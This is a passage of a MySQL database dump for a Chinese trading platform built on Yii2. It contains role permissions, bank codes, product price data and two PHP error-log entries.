INSERT INTO `auth_item` VALUES ('frontendSystemDestroy', '2', '一键销毁数据', null, null, '1480586668', '1480586668');
INSERT INTO `auth_item` VALUES ('frontendSystemLogDetail', '2', '查看日志详情', null, null, '1472794349', '1472794349');
INSERT INTO `auth_item` VALUES ('frontendSystemLogList', '2', '系统日志', null, null, '1472794349', '1472794349');
INSERT INTO `auth_item` VALUES ('frontendSystemMenu', '2', '系统菜单', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendSystemSaveSetting', '2', '修改系统设置', null, null, '1472720497', '1472720497');
INSERT INTO `auth_item` VALUES ('frontendSystemSetting', '2', '系统设置', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendUserAdminStateWithdraw', '2', '更改出金状态', null, null, '1502696759', '1502696759');
INSERT INTO `auth_item` VALUES ('frontendUserAdminsVerifyWithdraw', '2', '超管审核出金操作', null, null, '1502696759', '1502696759');
INSERT INTO `auth_item` VALUES ('frontendUserAdminsWithdrawList', '2', '超管审核出金管理', null, null, '1502695203', '1502695203');
INSERT INTO `auth_item` VALUES ('frontendUserAdminVerifyWithdraw', '2', '后台用户出金申请操作', null, null, '1502695409', '1502695409');
INSERT INTO `auth_item` VALUES ('frontendUserAdminWithdraw', '2', '后台用户申请出金列表', null, null, '1502695203', '1502695203');
INSERT INTO `auth_item` VALUES ('frontendUserChargeExcel', '2', '用户充值信息导出', null, null, '1491875833', '1491875833');
INSERT INTO `auth_item` VALUES ('frontendUserChargeRecordList', '2', '会员充值记录', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendUserChargeToday', '2', '今日会员充值记录', null, null, '1503539198', '1503539198');
INSERT INTO `auth_item` VALUES ('frontendUserDeleteUser', '2', '冻结/恢复用户', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendUserEditUserPass', '2', '修改会员密码', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendUserGiveList', '2', '会员赠金', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendUserGiveMoneyList', '2', '赠金记录', null, null, '1503651006', '1503651006');
INSERT INTO `auth_item` VALUES ('frontendUserList', '2', '会员列表', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendUserPositionList', '2', '会员持仓列表', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendUserRebateList', '2', '返点记录列表', null, null, '1480586668', '1480586668');
INSERT INTO `auth_item` VALUES ('frontendUserSearchMoney', '2', '订单状态查询 后', null, null, '1503539198', '1503539198');
INSERT INTO `auth_item` VALUES ('frontendUserSendCoupon', '2', '赠送优惠券', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendUserStateWithdraw', '2', '更改出金状态', null, null, '1502695203', '1502695203');
INSERT INTO `auth_item` VALUES ('frontendUserUserExcel', '2', '用户信息导出', null, null, '1491814259', '1491814259');
INSERT INTO `auth_item` VALUES ('frontendUserUserInte', '2', '会员积分兑换操作', null, null, '1502695203', '1502695203');
INSERT INTO `auth_item` VALUES ('frontendUserUserIntelist', '2', '会员积分列表', null, null, '1502695203', '1502695203');
INSERT INTO `auth_item` VALUES ('frontendUserVerifyManager', '2', '审核经纪人', null, null, '1477921692', '1477921692');
INSERT INTO `auth_item` VALUES ('frontendUserVerifyWithdraw', '2', '会员出金操作', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendUserWithdrawExcel', '2', '用户出金信息导出', null, null, '1491875833', '1491875833');
INSERT INTO `auth_item` VALUES ('frontendUserWithdrawList', '2', '会员出金管理', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('代理商管理', '1', 'frontend', null, null, '1480500162', '1502695438');
INSERT INTO `auth_item` VALUES ('后台管理员', '1', 'frontend', null, null, '1477837542', '1498033619');
INSERT INTO `auth_item` VALUES ('系统管理员', '1', 'frontend', null, null, '1472433243', '1481011370');
INSERT INTO `auth_item` VALUES ('综会管理', '1', 'frontend', null, null, '1495178027', '1502695450');
INSERT INTO `auth_item` VALUES ('超级管理员', '1', 'frontend', null, null, '1472448576', '1503651323');

-- ----------------------------
-- Table structure for auth_item_child
-- ----------------------------
DROP TABLE IF EXISTS `auth_item_child`;
CREATE TABLE `auth_item_child` (
  `parent` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `child` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`parent`,`child`),
  KEY `child` (`child`),
  CONSTRAINT `auth_item_child_ibfk_1` FOREIGN KEY (`parent`) REFERENCES `auth_item` (`name`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `auth_item_child_ibfk_2` FOREIGN KEY (`child`) REFERENCES `auth_item` (`name`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of auth_item_child
-- ----------------------------
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendAdminAjaxRoleInfo');
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendAdminCreateRole');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendAdminEditPoint');
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendAdminEditRole');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendAdminLeaderList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendAdminSaveLeader');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendOrderList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendOrderList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendOrderList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendOrderOrderExcel');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendProductAjaxAllDown');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendProductAjaxAllUp');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendProductDeletePrice');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendProductList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendProductSetTradePrice');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendProductSetTradeTime');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendRecordDepositList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendRecordDepositList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendRetailEditPoint');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendRetailEditPoint');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendRetailList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendRetailList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendRetailSaveRetail');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendRetailSaveRetail');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendRiskCenter');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendSaleEditPoint');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendSaleEditPoint');
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendSaleEditPoint');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendSaleEditPoint');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendSaleManagerList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendSaleManagerList');
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendSaleManagerList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendSaleManagerList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendSaleManagerRebateList');
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendSaleManagerRebateList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendSaleManagerRebateList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendShopEditInte');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendShopEditPrize');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendShopEditShop');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendShopInteList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendShopList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendShopPrizeList');
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendSystemSaveSetting');
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendSystemSetting');
INSERT INTO `auth_item_child` VALUES ('超级管理员', 'frontendUserAdminStateWithdraw');
INSERT INTO `auth_item_child` VALUES ('超级管理员', 'frontendUserAdminsVerifyWithdraw');
INSERT INTO `auth_item_child` VALUES ('超级管理员', 'frontendUserAdminsWithdrawList');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendUserAdminVerifyWithdraw');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserAdminVerifyWithdraw');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendUserAdminWithdraw');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserAdminWithdraw');
INSERT INTO `auth_item_child` VALUES ('超级管理员', 'frontendUserAdminWithdraw');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserChargeExcel');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendUserChargeRecordList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserChargeRecordList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserChargeRecordList');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendUserDeleteUser');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserDeleteUser');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserDeleteUser');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendUserEditUserPass');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserEditUserPass');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserEditUserPass');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserGiveList');
INSERT INTO `auth_item_child` VALUES ('超级管理员', 'frontendUserGiveMoneyList');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendUserList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserList');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendUserPositionList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserPositionList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserPositionList');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserRebateList');
INSERT INTO `auth_item_child` VALUES ('系统管理员', 'frontendUserRebateList');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserRebateList');
INSERT INTO `auth_item_child` VALUES ('超级管理员', 'frontendUserStateWithdraw');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserUserExcel');
INSERT INTO `auth_item_child` VALUES ('代理商管理', 'frontendUserVerifyManager');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserVerifyManager');
INSERT INTO `auth_item_child` VALUES ('综会管理', 'frontendUserVerifyManager');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserVerifyWithdraw');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserWithdrawExcel');
INSERT INTO `auth_item_child` VALUES ('后台管理员', 'frontendUserWithdrawList');
INSERT INTO `auth_item_child` VALUES ('超级管理员', '后台管理员');
INSERT INTO `auth_item_child` VALUES ('超级管理员', '系统管理员');

-- ----------------------------
-- Table structure for auth_rule
-- ----------------------------
DROP TABLE IF EXISTS `auth_rule`;
CREATE TABLE `auth_rule` (
  `name` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `data` text COLLATE utf8_unicode_ci,
  `created_at` int(11) DEFAULT NULL,
  `updated_at` int(11) DEFAULT NULL,
  PRIMARY KEY (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of auth_rule
-- ----------------------------

-- ----------------------------
-- Table structure for bank
-- ----------------------------
DROP TABLE IF EXISTS `bank`;
CREATE TABLE `bank` (
  `number` int(11) NOT NULL,
  `name` varchar(255) DEFAULT NULL COMMENT '名称',
  `state` tinyint(4) DEFAULT '0' COMMENT '0无效1有效'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of bank
-- ----------------------------
INSERT INTO `bank` VALUES ('102', '中国工商银行', '1');
INSERT INTO `bank` VALUES ('103', '中国农业银行', '1');
INSERT INTO `bank` VALUES ('104', '中国银行', '1');
INSERT INTO `bank` VALUES ('105', '中国建设银行', '1');
INSERT INTO `bank` VALUES ('201', '国家开发银行', '0');
INSERT INTO `bank` VALUES ('202', '中国进出口银行', '0');
INSERT INTO `bank` VALUES ('203', '中国农业发展银行', '0');
INSERT INTO `bank` VALUES ('301', '交通银行', '1');
INSERT INTO `bank` VALUES ('302', '中信银行', '0');
INSERT INTO `bank` VALUES ('303', '中国光大银行', '1');
INSERT INTO `bank` VALUES ('304', '华夏银行', '0');
INSERT INTO `bank` VALUES ('305', '中国民生银行', '1');
INSERT INTO `bank` VALUES ('306', '广东发展银行', '0');
INSERT INTO `bank` VALUES ('307', '深圳发展银行', '0');
INSERT INTO `bank` VALUES ('308', '招商银行', '1');
INSERT INTO `bank` VALUES ('309', '兴业银行', '0');
INSERT INTO `bank` VALUES ('310', '上海浦东发展银行', '1');
INSERT INTO `bank` VALUES ('313', '城市商业银行', '0');
INSERT INTO `bank` VALUES ('314', '农村商业银行', '0');
INSERT INTO `bank` VALUES ('315', '恒丰银行', '0');
INSERT INTO `bank` VALUES ('316', '浙商银行', '0');
INSERT INTO `bank` VALUES ('317', '农村合作银行', '0');
INSERT INTO `bank` VALUES ('318', '渤海银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('319', '徽商银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('320', '镇银行有限责任公司', '0');
INSERT INTO `bank` VALUES ('401', '城市信用社', '0');
INSERT INTO `bank` VALUES ('402', '农村信用社（含北京农村商业银行）', '0');
INSERT INTO `bank` VALUES ('403', '中国邮政储蓄银行', '1');
INSERT INTO `bank` VALUES ('501', '汇丰银行', '0');
INSERT INTO `bank` VALUES ('502', '东亚银行', '0');
INSERT INTO `bank` VALUES ('503', '南洋商业银行', '0');
INSERT INTO `bank` VALUES ('504', '恒生银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('505', '中国银行（香港）有限公司', '0');
INSERT INTO `bank` VALUES ('506', '集友银行有限公司', '0');
INSERT INTO `bank` VALUES ('507', '创业银行有限公司', '0');
INSERT INTO `bank` VALUES ('509', '星展银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('510', '永亨银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('512', '永隆银行', '0');
INSERT INTO `bank` VALUES ('531', '花旗银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('532', '美国银行有限公司', '0');
INSERT INTO `bank` VALUES ('533', '摩根大通银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('561', '三菱东京日联银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('563', '日本三井住友银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('564', '瑞穗实业银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('565', '日本山口银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('591', '韩国外换银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('593', '友利银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('591', '韩国外换银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('594', '韩国产业银行', '0');
INSERT INTO `bank` VALUES ('595', '新韩银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('596', '韩国中小企业银行有限公司', '0');
INSERT INTO `bank` VALUES ('597', '韩亚银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('621', '华侨银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('622', '大华银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('623', '星展银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('631', '泰国盘谷银行（大众有限公司）', '0');
INSERT INTO `bank` VALUES ('641', '奥地利中央合作银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('651', '比利时联合银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('652', '比利时富通银行有限公司', '0');
INSERT INTO `bank` VALUES ('661', '荷兰银行', '0');
INSERT INTO `bank` VALUES ('662', '荷兰安智银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('671', '渣打银行', '0');
INSERT INTO `bank` VALUES ('672', '英国苏格兰皇家银行公众有限公司', '0');
INSERT INTO `bank` VALUES ('691', '法国兴业银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('694', '法国东方汇理银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('695', '法国外贸银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('711', '德国德累斯登银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('712', '德意志银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('713', '德国商业银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('714', '德国西德银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('715', '德国巴伐利亚州银行', '0');
INSERT INTO `bank` VALUES ('716', '德国北德意志州银行', '0');
INSERT INTO `bank` VALUES ('732', '意大利联合圣保罗银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('741', '瑞士信贷银行股份有限公司', '0');
INSERT INTO `bank` VALUES ('742', '瑞士银行', '0');
INSERT INTO `bank` VALUES ('751', '加拿大丰业银行有限公司', '0');
INSERT INTO `bank` VALUES ('752', '加拿大蒙特利尔银行有限公司', '0');
INSERT INTO `bank` VALUES ('761', '澳大利亚和新西兰银行集团有限公司', '0');
INSERT INTO `bank` VALUES ('771', '摩根士丹利国际银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('775', '联合银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('776', '荷兰合作银行有限公司', '0');
INSERT INTO `bank` VALUES ('781', '厦门国际银行', '0');
INSERT INTO `bank` VALUES ('782', '法国巴黎银行（中国）有限公司', '0');
INSERT INTO `bank` VALUES ('785', '华商银行', '0');
INSERT INTO `bank` VALUES ('787', '华一银行', '0');
INSERT INTO `bank` VALUES ('969', '（澳门地区）银行', '0');
INSERT INTO `bank` VALUES ('989', '（香港地区）银行', '0');

-- ----------------------------
-- Table structure for coupon
-- ----------------------------
DROP TABLE IF EXISTS `coupon`;
CREATE TABLE `coupon` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `desc` varchar(50) NOT NULL COMMENT '描述',
  `remark` text COMMENT '备注信息',
  `amount` decimal(11,2) NOT NULL COMMENT '额度',
  `coupon_type` int(11) DEFAULT '0' COMMENT '优惠劵类型',
  `valid_day` int(11) NOT NULL COMMENT '有效时间（天）',
  PRIMARY KEY (`id`),
  UNIQUE KEY `amount` (`amount`,`coupon_type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='优惠券表';

-- ----------------------------
-- Records of coupon
-- ----------------------------

-- ----------------------------
-- Table structure for data_all
-- ----------------------------
DROP TABLE IF EXISTS `data_all`;
CREATE TABLE `data_all` (
  `name` varchar(20) NOT NULL COMMENT '产品名称',
  `price` varchar(20) DEFAULT '' COMMENT '当前价格',
  `time` datetime DEFAULT NULL COMMENT '当前时间',
  `diff` decimal(11,2) DEFAULT '0.00' COMMENT '涨跌值',
  `diff_rate` varchar(20) DEFAULT '0.00' COMMENT '涨跌%',
  `open` decimal(11,2) DEFAULT NULL,
  `high` decimal(11,2) DEFAULT NULL,
  `low` decimal(11,2) DEFAULT NULL,
  `close` decimal(11,2) DEFAULT NULL,
  PRIMARY KEY (`name`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='所有产品数据汇总表';

-- ----------------------------
-- Records of data_all
-- ----------------------------
INSERT INTO `data_all` VALUES ('a50', '9849.00', '2016-10-26 17:48:35', '-37.00', '0.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('ag', '4073', '2017-04-12 10:07:41', '18.00', '0.44%', '4061.00', '4085.00', '4058.00', '4073.00');
INSERT INTO `data_all` VALUES ('cl', '48.45', '2016-10-31 19:18:04', '-0.28', '0.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('conc', '5358', '2017-04-12 10:07:34', '0.18', '0.34%', '5339.00', '5360.00', '5335.00', '5358.00');
INSERT INTO `data_all` VALUES ('cu0', '48326', '2017-02-10 10:32:27', '-160.00', '-0.33%', '48426.00', '48478.00', '48192.00', '48486.00');
INSERT INTO `data_all` VALUES ('cu1610', '36580.00', '2016-09-02 13:54:33', '130.00', '0.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('gc', '1274.9', '2016-10-31 19:18:03', '-1.90', '0.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('hkhsi', '23374.40', '2016-10-20 16:10:22', '69.43', '0.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('ic1609', '6451.80', '2016-10-21 15:00:15', '-47.20', '-1.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('if1609', '3319.20', '2016-10-21 15:00:15', '1.80', '0.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('longyanxiang', '7545', '2017-08-24 16:19:31', '109.00', '0.63%', '7600.00', '7670.00', '7425.00', '7600.00');
INSERT INTO `data_all` VALUES ('mila', '-21', '2017-08-24 16:19:31', '283.00', '4.99%', '5844.00', '999.00', '-1.00', '5672.00');
INSERT INTO `data_all` VALUES ('ni1609', '78450.00', '2016-09-02 13:54:30', '1360.00', '2.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('oil', '476.33', '2016-12-02 11:07:27', '0.28', '0.06%', '477.09', '479.01', '475.29', '476.05');
INSERT INTO `data_all` VALUES ('rb1610', '2255.00', '2016-10-12 01:42:34', '50.00', '2.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('rm1609', '2329.00', '2016-09-02 13:54:33', '32.00', '1.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('ru1609', '10305.00', '2016-09-02 13:54:30', '190.00', '2.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('sh000001', '3131.76', '2016-12-22 11:35:03', '-5.67', '-0.18', '3132.16', '3141.37', '3128.57', '3137.43');
INSERT INTO `data_all` VALUES ('xag', '177.58', '2016-10-26 18:11:45', '0.03', '0.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('xau', '127765', '2017-04-12 10:09:00', '2.79', '0.22%', '127560.00', '127985.00', '127337.00', '127765.00');
INSERT INTO `data_all` VALUES ('xhn', '7500', '2016-12-22 11:39:59', '-0.14', '-0.19%', '7552.00', '7562.00', '7489.00', '7500.00');
INSERT INTO `data_all` VALUES ('xpt', '961.25', '2016-10-26 18:11:45', '-2.54', '0.00', null, null, null, null);
INSERT INTO `data_all` VALUES ('yushi', '12861', '2017-08-24 16:19:31', '176.00', '1.27%', '13208.00', '12975.00', '12605.00', '13856.00');

-- ----------------------------
-- Table structure for data_conc
-- ----------------------------
DROP TABLE IF EXISTS `data_conc`;
CREATE TABLE `data_conc` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `price` varchar(30) DEFAULT NULL,
  `time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `time` (`time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of data_conc
-- ----------------------------

-- ----------------------------
-- Table structure for data_longyanxiang
-- ----------------------------
DROP TABLE IF EXISTS `data_longyanxiang`;
CREATE TABLE `data_longyanxiang` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `price` varchar(30) DEFAULT NULL,
  `time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `time` (`time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of data_longyanxiang
-- ----------------------------


-- ----------------------------
-- Table structure for data_mila
-- ----------------------------
DROP TABLE IF EXISTS `data_mila`;
CREATE TABLE `data_mila` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `price` varchar(30) DEFAULT NULL,
  `time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `time` (`time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of data_mila
-- ----------------------------

-- ----------------------------
-- Table structure for data_yushi
-- ----------------------------
DROP TABLE IF EXISTS `data_yushi`;
CREATE TABLE `data_yushi` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `price` varchar(30) DEFAULT NULL,
  `time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `time` (`time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of data_yushi
-- ----------------------------

-- ----------------------------
-- Table structure for log
-- ----------------------------
DROP TABLE IF EXISTS `log`;
CREATE TABLE `log` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `level` int(11) DEFAULT NULL,
  `category` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `log_time` double DEFAULT NULL,
  `prefix` text COLLATE utf8_unicode_ci,
  `message` text COLLATE utf8_unicode_ci,
  PRIMARY KEY (`id`),
  KEY `idx_log_level` (`level`),
  KEY `idx_log_category` (`category`)
) ENGINE=InnoDB AUTO_INCREMENT=82 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of log
-- ----------------------------
INSERT INTO `log` VALUES ('1', '1', 'yii\\base\\ErrorException:2', '1495012124.6416', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=01996ece1176e2856355ae7ee2629d448f2b7a74&timestamp=1495012124&nonce=1025635710&openid=oAkX8wJx-E6cl2y_8zqcs9ElSK30][58.247.206.142][-][usvp075k3tee283rlo11cgikq0]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('2', '1', 'yii\\base\\ErrorException:2', '1495013469.356', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=cf41849e8e8ce70bfcf5fe3c467499036ebcb514&timestamp=1495013469&nonce=316088828&openid=oAkX8wA0DBTWNTNCit6o6G0kWNw8][58.247.206.150][-][oj8nma7dljilcacv3g6ekg5kf2]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
